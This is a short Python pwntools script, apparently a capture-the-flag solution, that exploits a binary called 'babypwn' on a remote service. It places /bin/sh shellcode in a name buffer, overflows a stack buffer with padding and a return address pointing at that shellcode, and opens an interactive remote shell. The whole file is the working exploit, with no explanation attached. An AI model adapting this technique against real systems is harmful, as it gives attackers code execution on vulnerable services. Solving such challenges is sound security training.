#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Distributed under terms of the MIT license.
# Author = nepire
#
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
#n = process('./babypwn')
n = remote('stack.overflow.fail',9000)
elf = ELF('./babypwn')

name = 0x601080
shellcode = asm(shellcraft.sh())

n.sendlineafter('name?\n',shellcode)
n.sendline("*")
n.sendline('1')
payload = 'a'*0x8F+'+'+p64(0)+p64(name)
n.sendline(payload)

n.interactive()
